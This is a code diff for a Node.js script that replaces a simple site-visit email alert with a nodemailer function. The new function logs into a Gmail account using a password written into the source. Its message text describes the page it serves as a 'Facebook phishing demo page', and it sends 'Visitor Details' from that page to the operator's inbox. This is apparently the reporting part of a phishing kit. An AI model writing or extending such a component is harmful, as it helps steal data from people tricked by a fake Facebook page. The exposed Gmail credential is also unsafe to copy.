@@ -1,25 +1,26 @@
-const { Resend } = require('resend');
+const nodemailer = require('nodemailer');
 
-exports.handler = async (event, context) => {
-    const resend = new Resend(process.env.RESEND_API_KEY); // Secure API Key
+async function sendEmailAlert(details) {
+  try {
+    let transporter = nodemailer.createTransport({
+      service: 'gmail', // e.g., 'gmail', 'outlook', 'yahoo'
+      auth: {
+        user: 'mwananchihuslerloans@gmail.com', // Your email address
+        pass: 'dttd hjuy rlaq oksu' // Your email password or app password
+      }
+    });
 
-    try {
-        const data = await resend.emails.send({
-            from: 'noreply@yourdomain.com', // Must be verified on Resend
-            to: 'mwananchihuslerloans@gmail.com',
-            subject: 'Site Visit Notification',
-            html: '<strong>Alert:</strong> A visitor has just accessed your site.'
-        });
+    let info = await transporter.sendMail({
+      from: 'mwananchihuslerloans@gmail.com',
+      to: 'mwananchihuslerloans@gmail.com', // The email address to receive alerts
+      subject: 'Website Visit Alert!',
+      text: 'Someone visited your Facebook phishing demo page.\n\nVisitor Details:\n' + details
+    });
 
-        return {
-            statusCode: 200,
-            body: JSON.stringify({ message: 'Email Sent Successfully!', data }),
-        };
-    } catch (error) {
-        console.error('Error:', error);
-        return {
-            statusCode: 500,
-            body: JSON.stringify({ message: 'Failed to send email', error }),
-        };
-    }
-};
+    console.log('Message sent: %s', info.messageId);
+  } catch (error) {
+    console.error('Error sending email:', error);
+  }
+}
+
+sendEmailAlert(process.argv[2]); // Get details from command-line argument
